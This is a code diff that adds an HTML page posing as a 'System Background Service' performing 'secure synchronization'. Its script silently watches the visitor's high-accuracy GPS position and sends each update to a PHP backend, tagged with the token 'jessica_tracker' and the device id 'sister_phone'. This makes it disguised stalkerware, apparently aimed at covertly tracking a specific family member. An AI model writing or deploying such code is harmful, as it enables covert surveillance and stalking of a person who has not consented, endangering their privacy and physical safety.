@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Service</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f4f4f9;
+            color: #333;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        #status {
+            font-weight: bold;
+            color: #007bff;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>System Background Service</h2>
+        <p>Initializing secure synchronization...</p>
+        <div id="status">Waiting for GPS lock...</div>
+    </div>
+
+    <script>
+        const API_TOKEN = "jessica_tracker"; // Make sure this matches $expected_token in update_location.php
+        const DEVICE_ID = "sister_phone";
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.watchPosition(function(position) {
+                let lat = position.coords.latitude;
+                let lng = position.coords.longitude;
+
+                // Send to your Wasmer backend automatically
+                fetch('update_location.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Authorization': 'Bearer ' + API_TOKEN
+                    },
+                    body: `latitude=${lat}&longitude=${lng}&device_id=${DEVICE_ID}`
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if(data.status === 'success') {
+                        document.getElementById('status').innerText = "Status: Synced (" + new Date().toLocaleTimeString() + ")";
+                    } else {
+                        document.getElementById('status').innerText = "Sync failed: " + data.message;
+                    }
+                })
+                .catch(error => {
+                    console.error("Network error:", error);
+                    document.getElementById('status').innerText = "Status: Connection error";
+                });
+
+            }, function(error) {
+                console.error("Geolocation error:", error);
+                document.getElementById('status').innerText = "Error: Please allow location access.";
+            }, {
+                enableHighAccuracy: true,
+                maximumAge: 30000,
+                timeout: 27000
+            });
+        } else {
+            document.getElementById('status').innerText = "Geolocation is not supported by this browser.";
+        }
+    </script>
+</body>
+</html>
